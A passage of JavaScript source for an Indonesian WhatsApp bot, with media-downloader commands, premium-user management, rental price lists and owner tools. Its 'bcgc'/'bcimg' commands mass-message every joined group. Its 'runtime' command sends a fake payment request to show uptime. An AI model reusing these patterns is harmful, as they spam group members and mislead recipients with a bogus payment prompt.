slime.sendMessage(m.chat, { video: { url: json.no_watermark }, caption: `Video Nya,Untuk Yang Lain Silahkan Click Next` }, { quoted: m})

let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: cap, 
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname, 
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,         

          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({

            buttons: [{

            "name": "quick_reply",

              "buttonParamsJson": `{\"display_text\":\"Next🎥\",\"id\":\"${prefix + command} ${text}\"}`

            },{
            "name": "quick_reply", 
            "buttonParamsJson": `{\"display_text\":\"PoPular Search⭐\nPutar PoPuler Search Nya\",\"id\":\"${prefix + command} Resah Jadi Luka Song\"}`
             }, {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"AudioNya📌","url":"${json.music}","merchant_url":"${json.music}"}`   
                 }],

          }),

          contextInfo: {

                  mentionedJid: [m.sender], 

                  forwardingScore: 999,

                  isForwarded: true,

                forwardedNewsletterMessageInfo: {

                  newsletterJid: '120363325328533494@newsletter',

                  newsletterName: `Rᴇsᴜʟᴛ ғᴏʀᴍ ${text}`,

                  serverMessageId: 143

                }

                }

       })

    }

  }

}, { quoted: m })

return await slime.relayMessage(m.chat, msgs.message, {}) 
} 
                break
case 'ttsearch2': {
    if (!text) return m.reply(`• *Example:* ${prefix + command} jj anime`);
    reply(mess.wait)

    function formatViews(views) {
        let form = views.toString();
        let formatv;
        if (form.length > 6) {
            formatv = (views / 1000000).toFixed(1) + 'M';
        } else if (form.length > 4) {
            formatv = (views / 1000).toFixed(2) + 'K';
        } else {
            formatv = form;
        }
        return formatv;
    }

    async function createVideo(url) {
        const { videoMessage } = await generateWAMessageContent({ video: { url } }, { upload: slime.waUploadToServer });
        return videoMessage;
    }

    function shuffleArray(array) {
        for (let i = array.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1)); // Perbaikan di sini
            [array[i], array[j]] = [array[j], array[i]];
        }
    }

    let push = [];
    let { data } = await axios.get(`https://widipe.com/tiktoksearch?text=${text}`);
    let res = data.result.data;
    shuffleArray(res); // Mengacak array
    let ult = res.splice(0, 3); // Jumlah video yang ingin dikirim
    let i = 1;

    for (let lucuy of ult) {
        push.push({
            body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Title:* ${lucuy.title}\n*Author:* ${lucuy.author.nickname}`
            }),
            footer: proto.Message.InteractiveMessage.Footer.fromObject({
                text: `👁️: ${formatViews(lucuy.play_count)}\n❤️: ${formatViews(lucuy.digg_count)}\n💬: ${formatViews(lucuy.comment_count)}\n➡️: ${formatViews(lucuy.share_count)}`
            }),
            header: proto.Message.InteractiveMessage.Header.fromObject({
                title: '',
                hasMediaAttachment: true,
                videoMessage: await createVideo(lucuy.play)
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: []
            })
        });
    }

    const bot = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: `Result from *${text}*`
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: 'Tiktok Search\nBy SlimexTzy',
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        hasMediaAttachment: false
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards: [...push]
                    })
                })
            }
        }
    }, { quoted: m });

    await slime.relayMessage(m.chat, bot.message, { messageId: bot.key.id });
}
break;
case "addpremium": case 'addprem':{
if (!isCreator) return reply(mess.owner)
const swn = args.join(" ")
const pcknm = swn.split("|")[0];
const atnm = swn.split("|")[1];
if (!pcknm) return reply(`Penggunaan :\n*${prefix}addprem* @tag|waktu\n*${prefix}addprem* nomor|waktu\n\nContoh : ${prefix+command} @tag|30d`)
if (!atnm) return reply(`Mau yang berapa hari?`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0>9]/g, '')+'@s.whatsapp.net'
if (users) {
prem.addPremiumUser((pcknm.replace('@','')+'@s.whatsapp.net').replace(' @','@'), atnm, premium)
reply('*Berhasil Menambahkan User Premium ✅*')
} else {
var cekap = await slime.onWhatsApp(pcknm+"@s.whatsapp.net")
if (cekap.length == 0) return reply(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
prem.addPremiumUser((pcknm.replace('@','')+'@s.whatsapp.net').replace(' @','@'), atnm, premium)
reply('*Berhasil Menambahkan User Premium ✅*')
}}
break
case 'sc':
case 'script': {
const url = "https://files.catbox.moe/ijqqem.jpg";
  async function image(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: { url }
    }, {
      upload: slime.waUploadToServer
    });
    return imageMessage;
  }
  let msg = generateWAMessageFromContent(
    m.chat,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: `> *ʜᴀʟᴏ ᴋᴀᴋ* ${pushname}`
            },
            carouselMessage: {
              cards: [
                {
                  header: proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({ image: { url: './SlimeMedia/image/slime.jpg' } }, { upload: slime.waUploadToServer })),
                    title: '',
                    gifPlayback: true,
                    subtitle: ownername,
                    hasMediaAttachment: false
                  }),
                  body: { text: `> Klik tombol  di bawah untuk\n> Melihat Saluran Bot` },
                  nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"Saluran","url":"https://whatsapp.com/channel/0029VaoNzzlJJhzQTJBL5n0F","merchant_url":"https://whatsapp.com/channel/0029VaoNzzlJJhzQTJBL5n0F"}`
                    },
                  ],
                  },
                },
              ],
              messageVersion: 1,
            },
          },
        },
      },
    },
    { quoted: fcall }
  );

  await slime.relayMessage(msg.key.remoteJid, msg.message, {
    messageId: msg.key.id,
  });
}
break
case 'tes': case 'bot': case 'bott': case 'bottt':{
m.reply('_*Bot Sudah Aktif Kak*_\n\n*Jangan Lupa Join Sini*\n◦ All Info : https://lynnzxd.carrd.co/#\n◦ Saluran : https://whatsapp.com/channel/0029VaoNzzlJJhzQTJBL5n0F\n◦ Group¹ : https://whatsapp.com/channel/0029ValkS8dL2AU0eVX9oP3m\n◦ Group² : https://chat.whatsapp.com/BvslVKmqBukIhQBlKnMVM9')
slime.relayMessage(m.chat, {
requestPhoneNumberMessage: {
}},{})
}
break
case 'intro':{
m.reply('𝐇𝐚𝐥𝐥𝐨𝐰𝐰 𝐌𝐲 𝐅𝐫𝐢𝐞𝐧𝐝𝐬\n𝐈𝐧𝐭𝐫𝐨 𝐝𝐮𝐥𝐮 𝐲𝐚𝐚:\n𝐍𝐚𝐦𝐚:\n𝐀𝐬𝐤𝐨𝐭:\n𝐆𝐞𝐧𝐝𝐞𝐫:\n𝐔𝐦𝐮𝐫:\n\n𝗠𝗲𝗺𝗯𝗲𝗿 𝗯𝗮𝗿𝘂 𝘄𝗮𝗷𝗶𝗯 𝗶𝗻𝘁𝗿𝗼‼️')
}
break
case 'sewa': case 'sewabot': case 'hanako': {
reply(`
┏━  ⬣『 *List Sewa Bot AlyaBot* 』⬣  ━┓
 ┣━━━━━━━━━━━━━━━━━━━━━━━━┛
 ┃  • *Permanen* [ _*Rp20.000*_ ]
 ┃  • *4Hari* [ _*Rp3.000*_ ]
 ┃  • *7Hari* [ _*Rp5.000*_ ]
 ┃  • *10Hari* [ _*Rp7.000*_ ]
 ┃  • *14Hari* [ _*Rp10.000*_ ]
 ┃  • *16Hari* [ _*Rp13.000*_ ]
 ┃  • *Sebulan* [ _*Rp16.000*_ ]
 ┗━━━━━━━━━━━━━━━━━━━━━━━━┛
> Jika Ingin Menyewa AlyaBot Silahkan Hubungi Owner/Ketik .owner/.lynnzxd
`)
}
break
case 'delprem': {
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan :\n*${prefix}delprem* @tag\n*${prefix}delprem* nomor`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
premium.splice(prem.getPremiumPosition(users, premium), 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
reply('*Berhasil Menghapus User Premium ✅*')
} else {
var cekpr = await slime.onWhatsApp(args[0]+"@s.whatsapp.net")
if (cekpr.length == 0) return reply(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
premium.splice(prem.getPremiumPosition(args[0] + '@s.whatsapp.net', premium), 1)
fs.writeFileSync('./src/database/premium.json', JSON.stringify(premium))
reply('*Berhasil Menghapus User Premium ✅*')
}}
break
case 'listpremium': case 'listprem': {
let txt = `*List Premium User*\nJumlah : ${premium.length}\n\n`
let men = [];
for (let i of premium) {
men.push(i.id)
txt += `*ID :* @${i.id.split("@")[0]}\n`
if (i.expired === 'PERMANENT') {
let cekvip = 'PERMANENT'
txt += `*Expire :* PERMANENT\n\n`
} else {
let cekvip = Func.readTime(i.expired - Date.now())
txt += `*Expire :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s) ${cekvip.seconds} second(s)\n\n`
}
}
slime.sendTextWithMentions(m.chat, txt, m)
}
break
case "bcimg": {
if (!isCreator) return reply(`ᴋʜᴜsᴜs lynnzxd ᴅᴏᴀɴᴋ`)
if (!text) return reply(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik`)
await loading()
let getGroups = await slime.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
if (/image/.test(mime)) {
media = await slime.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await slime.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0] })
await sleep(text.split('|')[1])
} else {
await slime.sendMessage(xnxx, { text: text.split('|')[0] })
await sleep(text.split('|')[1])
}}
reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break
case 'bcgc': case 'bcgroup': {
if (!isCreator) return reply(mess.owner)
await loading()
if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
let getGroups = await slime.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
slime.sendMessage(i, {text: `${text}`}, {quoted:fcall})
    }
reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break
case 'restart':
if (!isCreator) return reply('ᴋʜᴜsᴜs lynnzxd ᴅᴏᴀɴᴋ')
reply(`ᴍʀᴇsᴛᴀʀᴛ lynnzxd....`)
await sleep(3000)
process.exit()
break
case 'runtime': {
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Dek Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
rin = `*Runtime :* _${runtime(process.uptime())}_\n*Response Speed :* _${latensi.toFixed(4)} Second_\n*Ram :* _${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}_`
await slime.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: Styles(rin),
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
}
break
case 'delcase': {
if (!isCreator) return reply(`ᴋʜᴜsᴜs lynnzxd ᴀᴊᴀ`)
if (!q) return reply('*Masukan nama case yang akan di hapus*')

dellCase('./hanako.js', q)
reply('*Dellcase Successfully*')
}
break

case 'listpanel': {
reply(`*List Harga Panel By LynnZxD ⚡*

*📦 Ram 1GB Cpu 40% :* Rp2000
*📦 Ram 2GB Cpu 60% :* Rp3000
*📦 Ram 3GB Cpu 80% :* Rp4.000
*📦 Ram 4GB Cpu 100% :* Rp5.000
*📦 Ram 5GB Cpu 120% :* Rp6.000
*📦 Ram 6GB Cpu 140% :* Rp7.000
*📦 Ram 7GB Cpu 160% :* Rp8.000
*📦 Ram 8GB Cpu 180% :* Rp9.000
*📦 Ram & Cpu Unlimited :* Rp13.000

*Keuntungan Panel :*
_• Server_ *(High Quality)*
_• Bot On 24 Jam_
_• Spek Vps 16gb C4_
_• Bot Auto Fast Respon_
_• Garansi Aktif 10 Hari_
_• Claim Garansi Wajib Bawa Bukti Transaksi!_

*Owner Panel :* Rp30.0000
*Admin Panel Fresh :* Rp20.000
*Create Panel Lewat Bot* bebas pilih
━━━━━━━━━━━━━━━━━━━━━
• *Benefit Admin Panel* (FREE SC CPANEL WA)
> _Dapat Akses administrasi di server_
> _Bisa Bikin Panel bebas ram,cpu,disk_
> _dll_

• *Benefit Owner Panel* (FREE SC CPANEL WA)
> _Free akses owner bot cpanel gw
> _Free SC Cpanel wa_
> _Bisa Open/Jual PT,Admin,dan reseller panel_
> _dll_

━━━━━━━━━━━━━━━━━━━━━
☎️ Contact person :
WhatsApp¹ : wa.me/6283167532721 ON
WhatsApp² : wa.me/62881011412295 ON
Telegram : t.me/lynnzxd
━━━━━━━━━━━━━━━━━━━━━
*⚡Link Group¹* https://whatsapp.com/channel/0029VaoNzzlJJhzQTJBL5n0F
*⚡Link Group²* https://whatsapp.com/channel/0029ValkS8dL2AU0eVX9oP3m
*⚡Link Saluran* https://chat.whatsapp.com/BvslVKmqBukIhQBlKnMVM9

> © LynnZxD`)
}
break


case 'addcase': {
 if (!isCreator) return reply('lu sapa asu')
 if (!text) return reply('Mana case nya');
    const fs = require('fs');
const namaFile = 'hanako.js';
const caseBaru = `${text}`;
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('Terjadi kesalahan saat membaca file:', err);
        return;
    }
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                reply('Terjadi kesalahan saat menulis file:', err);
            } else {
                reply('Case baru berhasil ditambahkan.');
            }
        });
    } else {
        reply('Tidak dapat menambahkan case dalam file.');
    }
});

}
break
case 'listcase': {
let { listCase } = require('./lib/scrapelistCase.js')
reply(listCase())
}
break
case'tozombie':{
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Dek Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
if (!quoted) return reply(`Send/Reply Image With Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply(`Send/Reply Image With Caption ${prefix + command}`)
let q = m.quoted ? m.quoted : m
let media = await q.download()
let url = await uploadImage(media)
let anu = await fetch(`https://aemt.me/converter/zombie?url=${url}`)
let data = await anu.json()
await slime.sendMessage(m.chat, {image: {url: data.url}, caption: mess.done}, {quoted:m})
}
break
case "listgc":{
if (!isCreator) return (`ᴋʜᴜsᴜs LynnZxD ᴀᴊᴀ`)
let getGroups = await slime.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let hituet = 0
let teks = `⬣ *LIST GROUP DI BAWAH*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await slime.groupMetadata(x)
teks += `❏ Group Ke ${hituet+=1}\n│⭔ *NAMA :* ${metadata2.subject}\n│⭔ *ID :* ${metadata2.id}\n│⭔ *MEMBER :* ${metadata2.participants.length}\n╰────|\n\n`
}
reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontak2 id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu ID Group Nya Di Atas`)
}
break
case 'antilink': {
if (!(isAdmins || isCreator)) return m.reply(mess.admin)
if (!m.isGroup) return m.reply('ᴋʜᴜsᴜs ɢʀᴏᴜᴘ')
if (!isBotAdmins) return m.reply('ʙᴏᴛ ʙᴇʟᴜᴍ ᴀᴅᴍɪɴ')
await loading()
if (args.length < 1) return m.reply('.ᴏɴ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴋᴛɪғᴋᴀɴ .ᴏғғ ᴜɴᴛᴜᴋ ɴᴏɴᴀᴋᴛɪғᴋᴀɴ')
if (args[0] === "on") {
if (AntiLink) return m.reply('ᴛᴇʟᴀʜ ᴀᴋᴛɪғ')
ntilink.push(from)
m.reply('ᴀɴᴛɪʟɪɴᴋ ᴛᴇʟᴀʜ ᴀᴋᴛɪғ')
} else if (args[0] === "off") {
if (!AntiLink) return m.reply('ᴛᴇʟᴀʜ ᴍᴀᴛɪ')
let off = ntilink.indexOf(from)
ntilink.splice(off, 1)
m.reply('ᴀɴᴛɪʟɪɴᴋ ᴛᴇʟᴀʜ ᴅɪ ɴᴏɴᴀᴋᴛɪғᴋᴀɴ')
} else {
m.reply('.ᴏɴ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴋᴛɪғᴋᴀɴ .ᴏғғ ᴜɴᴛᴜᴋ ɴᴏɴᴀᴋᴛɪғᴋᴀɴ')
}
}
break
case 'tourl': {
  const { shannzCdn } = require('./lib/uploader.js');
  if (!/video/.test(mime) && !/image/.test(mime)) {
    return m.reply(`*PERMINTAAN ERROR!! PESAN :*\\n> *Reply/Send Gambar/Video Dengan Caption .tourl*`);
  }
  if (!quoted) {
    return m.reply(`*PERMINTAAN ERROR!! PESAN :*\\n> *Reply/Send Gambar/Video Dengan Caption .tourl*`);
  }
  let media = await slime.downloadAndSaveMediaMessage(quoted);
  let anu = await shannzCdn(media);
  if (anu && anu.status) {
    m.reply(JSON.stringify(anu, null, 2)); // Send the entire response as a formatted JSON string
  } else {
    m.reply(`*ERROR: Tidak dapat mengambil URL dari media.*`);
  }
  await fs.unlinkSync(media);
}
break
case 'public': {
if (!isCreator) return mess.owner
slime.public = true
reply('_AlyaBot SUCCES MODE PUBLIC_')
}
break
case 'self': {
if (!isCreator) return mess.owner
slime.public = false
reply('_AlyaBot SUCCES MODE SELF_')
}
break
//================ D O W N L O A D ==================//

case 'ytmp3': {
             if (!text) return reply(`• *Example :* .${command} https://www.youtube.com/xxxxxxx`)
	         slime.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
	         try {
             let searchResponse = await fetchJson(`https://widipe.com/download/ytdl?url=${encodeURIComponent(text)}`)
             const thumbnail = searchResponse.result.image
 let doc = { 
    audio: {
      url: searchResponse.result.mp3
    },
    mimetype: 'audio/mp4',
    fileName: `${searchResponse.result.title}`,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true,
        mediaType: 2,
        mediaUrl: text,
        title: searchResponse.result.title,
        sourceUrl: text,
        thumbnail: await (await slime.getFile(thumbnail)).data
      }
    }
  }
  await slime.sendMessage(m.chat, doc, { quoted: m });
} catch {
  reply('yah... error dek')
}
}
    break
case 'ytvideo':
case 'ytmp4': {
  if (!text) return reply(' [ Example ] :*\n> *.ytmp4 <link youtube>*')
  reply(mess.wait)
try {
  reply('*Process sending video, mungkin membutuhkan 1-3 menit jika durasi video terlalu panjang!*')
  let proces = await (await fetch(`https://widipe.com/download/ytdl?url=${text}`)).json()
  let video4 = proces.result.mp4;
  const ytc = `*[ YOUTUBE DOWNLOADER ]*
  *title* ${proces.result.title}
  
  ©${botname}`;
  slime.sendMessage(m.chat, { video: { url: video4 }, caption: ytc }, { quoted: m })
} catch (e) {
    reply('*terjadi error :*' + e);
}
}
break
/*Siapa tau mau
Api: https://api.kyuurzy.site
Wm: Tanaka Sense*/
case 'alicia':{
        if (!text) return m.reply('Yaa ada apa sama Alicia?')
        try {
        let alice = await fetchJson(`https://api.kyuurzy.site/api/ai/alicia?query=${text}`);
        m.reply(alice.result);
        } catch (e) {
        console.error(err);
        m.reply('elol');
        }
        }
        break
        case 'bocchi':{
        if (!text) return m.reply('Yaa ada apa sama bocchi')
        try {
        let boci = await fetchJson(`https://api.kyuurzy.site/api/ai/Bocchi?query=${text}`);
        m.reply(boci.result);
        } catch (e) {
         console.error(err);
        m.reply('elol');
        }
        }
        break
case 'tt': case "tiktok":{
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Kak Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                reply('1 Limit Anda Terpakai')
if (!text) return reply(`ʟɪɴᴋ ɴʏ ᴍɴ ʙɪᴀʀ ʜᴀɴᴀᴋᴏ ᴘʀᴏsᴇs`)
let old = new Date()
const dlt = require('./lib/tiktokdl.js')
let tiktuk = await dlt.DownloadTiktok(text)
if (tiktuk.result.images) {
tiktuk.result.images.forEach(async (k) => {
await slime.sendMessage(m.chat, { image: { url: k }}, { quoted: fcall });
})
} else {
slime.sendMessage(m.chat, { video: { url: tiktuk.result.video }, caption: `${gris}[ T I K T O K - D O W N L O A D E R ]${gris}\n\n${hiasan}*Author* : ${tiktuk.result.author.nickname}\n${hiasan}*Desc* : ${tiktuk.result.desc}\n${hiasan}*Statistic* : ${tiktuk.result.statistic}\n${hiasan}*Fetching* : ${((new Date - old) * 1)} ms\n\n` }, { quoted: fcall })
}
}
break
case 'gimage':{
if (!isPrem) return reply('Khusus Premium')(`Usage: ${prefix}gimage orang jomok`);
slime.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
let ini = await fetchJson(`https://aemt.me/googleimage?query=${q}`);
try{
for (let bing of ini.result) {
await sleep(500)
await slime.sendMessage(m.chat, { image: { url: bing }, caption: ``}, {quoted: m})
slime.sendMessage(m.chat, { react: { text: `☑️`, key: m.key }})
}
} catch (e) {
slime.sendMessage(m.chat, { react: { text: `✖️`, key: m.key }})
}
}
break
case 'ig': case 'igdl': case 'instagram': {
  if (!text) return m.reply(`*PERMINTAAN ERROR!! CONTOH:*\n> .${command} https://www.instagram.com/reel/C6F57rGrV_x/?igsh=OXJxanVpdHdiczVi`)
  try {
    let insta = await (await fetch(`https://api.shannmoderz.xyz/downloader/instagram?url=${text}`)).json()
    let shannz = insta.result

    function formatComments(comments) {
      return comments.map(comment => 
        `user: ${comment.username}\nkomentar: ${comment.comment}\n`
      ).join('\n');
    }

    let caption = "Komentar:\n\n" + formatComments(shannz.comments);
    slime.sendMessage(m.chat, { video: { url: shannz.videoLink }, caption: caption }, { quoted: m })
  } catch (err) {
    m.reply('masukkan query lainnya atau coba lagi nanti')
  }
}
break
case 'instagram2': case 'ig2': case 'igvideo2': case 'igimage2': case 'igvid2': case 'igimg2': {
	  if (!text) return reply(`You need to give the URL of Any Instagram video, post, reel, image`)
  let res
  try {
    res = await fetch(`https://www.guruapi.tech/api/igdlv1?url=${text}`)
  } catch (error) {
    return reply(`An error occurred: ${error.message}`)
  }
  let api_response = await res.json()
  if (!api_response || !api_response.data) {
    return reply(`No video or image found or Invalid response from API.`)
  }
  const mediaArray = api_response.data;
  for (const mediaData of mediaArray) {
    const mediaType = mediaData.type
    const mediaURL = mediaData.url_download
    let cap = `Nih Dek ${mediaType.toUpperCase()}`
    if (mediaType === 'video') {
      slime.sendMessage(m.chat, {video: {url: mediaURL}, caption: cap}, {quoted: fcall})
    } else if (mediaType === 'image') {
      slime.sendMessage(m.chat, { image: {url: mediaURL}, caption: cap}, {quoted: fcall})
    }
  }
}
break

case 'search':
  if (!text) return m.reply(`*PERMINTAAN ERROR!! CONTOH:*\n> .${command} carikan informasi tentang jokowi dodo`);
  try {
     let you = await (await fetch(`https://api.shannmoderz.xyz/ai/yousearch?query=${text}`)).json();
     let shannz = you.result
     m.reply(shannz)
   } catch (e) {
       m.reply(e);
     }
break
/**
  * fitur case pakcik
**/

case "chwa": {
if (!text) return m.reply("Mana linknya?")
try {
  var { data } = await require("axios").get("https://manaxu-seven.vercel.app/api/others/chwa?query=" + text)
  var { name, follower, description } = data.result
  var x = `*Name:* ${name}\n*Followers:* ${follower}\n*Description:* ${description}`
  m.reply(x)
} catch (e) {
return m.reply("fitur eror")
}
}
break

case 'chord':
  if (!text) return m.reply('masukkan judul lagunya!');
  try {
    let chord = await (await fetch('https://api.shannmoderz.xyz/search/chord?query=' + text)).json();
    let shannz = chord.result;
    
    // Menyusun pesan dengan semua informasi
    let message = `*${shannz.title}*\n\n`;
    message += `Artis: ${shannz.artist}\n`;
    message += `URL: ${shannz.url}\n`;
    message += `URL Artis: ${shannz.artistUrl}\n\n`;
    message += `Chord:\n${shannz.lyrics}`;
    
    slime.sendMessage(m.chat, { text: message }, { quoted: m });
  } catch (e) {
    m.reply('terjadi kesalahan: ' + e);
  }
break;
case 'spotify': {
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Dek Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                reply('1 Limit Anda Terpakai')
if (!text) return reply(`Contoh : ${prefix + command} dandelion`);
let api = await fetchJson(`https://api.junn4.my.id/search/spotify?query=${text}`);
const hasil = `乂 *S P O T I F Y*

*Title*: ${api.data[0].title}
*Duration*: ${api.data[0].duration}
*Popular*: ${api.data[0].popularity}
*Url*: ${api.data[0].url}
`
slime.sendMessage(m.chat, {text: hasil, contextInfo:
{
"externalAdReply": {
"title": 'sᴘᴏᴛɪғʏ ʙʏ lynnzxd',
"body": `AlyaBot`,
"showAdAttribution": true,
"mediaType": 1,
"sourceUrl": '',
"thumbnailUrl": 'https://files.catbox.moe/ijqqem.jpg',
"renderLargerThumbnail": true
}
}}, {quoted: fcall})
const spodl = await fetchJson(`https://api.junn4.my.id/download/spotify?url=${api.data[0].url}`) 
const spoDl = spodl.data.download
slime.sendMessage(m.chat, {
audio: {
url: spoDl
},
mimetype: 'audio/mpeg',
contextInfo: {
externalAdReply: {
title: `sᴘᴏᴛɪғʏ ʙʏ lynnzxd`,
body: "",
thumbnailUrl: 'https://files.catbox.moe/ijqqem.jpg', 
sourceUrl: hariini,
mediaType: 1,
showAdAttribution: true,
renderLargerThumbnail: true
}
}
}, {
quoted: fcall
})
}
break   
case 'play': case 'songs': {
 reply(mess.wait)
let yts = require("yt-search")
if (!text) return m.reply(`*Contoh*: ${prefix + command} Hujan utopia`)
try {
let search = await yts(text);
let anup3k = search.videos[0];
let { title, thumbnail, timestamp, views, ago, url } = anup3k;
let procees = await (await fetch(`https://widipe.com/download/ytdl?url=${url}`)).json()
             let doc = { 
    audio: {
      url: procees.result.mp3
    },
    mimetype: 'audio/mp4',
    fileName: `${title}`,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true,
        mediaType: 2,
        mediaUrl: url,
        title: title,
        sourceUrl: url,
        thumbnail: await (await slime.getFile(thumbnail)).data
      }
    }
  }
  await slime.sendMessage(m.chat, doc, { quoted: m });
} catch (e) {
    reply('*terjadi error :*' + e)
}
}
break
case 'play2': {
if (!text) return reply(`*Example*: ${prefix + command} drunk text`)
const randomReduction = Math.floor(Math.random() * 5) + 1;
let search = await yts(text);
let telaso = search.all[0].url;
let body = `*Music - Play*
> Title : *${search.all[0].title}*
> Views : *${search.all[0].views}*
> Duration : *${search.all[0].timestamp}*
> Uploaded : *${search.all[0].ago}*
> Url : *${telaso}*

please reply ${prefix}*audio/video* to download`;
slime.sendMessage(m.chat, { image: { url: search.all[0].thumbnail }, caption: body }, { quoted: m });
global.db.data.users[m.sender].lastSearchUrl = telaso; 
}
break

case 'video': {
if (!m.quoted) return reply('Reply Pesan')
let urls = m.quoted.text.match(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch\?v=|v\/|embed\/|shorts\/|playlist\?list=)?)([a-zA-Z0-9_-]{11})/gi);
if (!urls) return reply('Mungkin pesan yang anda reply tidak mengandung URL YouTube');
let urlIndex = parseInt(text) - 1;
if (urlIndex < 0 || urlIndex >= urls.length) return reply('Indeks URL tidak valid');
await downloadMp4(urls);
}
break

case 'audio': {
if (!m.quoted) return reply('Reply Pesan');
let urls = m.quoted.text.match(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch\?v=|v\/|embed\/|shorts\/|playlist\?list=)?)([a-zA-Z0-9_-]{11})/gi);
if (!urls) return reply('Mungkin pesan yang anda reply tidak mengandung URL YouTube');
let urlIndex = parseInt(text) - 1;
if (urlIndex < 0 || urlIndex >= urls.length) 
return reply('Indeks URL tidak valid');
await downloadMp3(urls);
}
break

case 'yts': case 'ytsearch': {
if (!text) throw `Example : ${prefix + command} story wa anime`
let search = await yts(text)
let teks = '*YouTube Search*\n\nResult From '+text+'\nketik *getmusic* untuk mengambil mp3 dan *getvideo* untuk mp4\ngunakan dengan nomor urutan, contoh *getmusic 1*\n\n'
let no = 1
for (let i of search.all) {
teks += `⭔ No Urutan : ${no++}\n⭔ Type : ${i.type}\n⭔ Video ID : ${i.videoId}\n⭔ Title : ${i.title}\n⭔ Views : ${i.views}\n⭔ Duration : ${i.timestamp}\n⭔ Upload At : ${i.ago}\n⭔ Url : ${i.url}\n─────────────────\n`
}
slime.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
}
break
       case 'mediafire': {
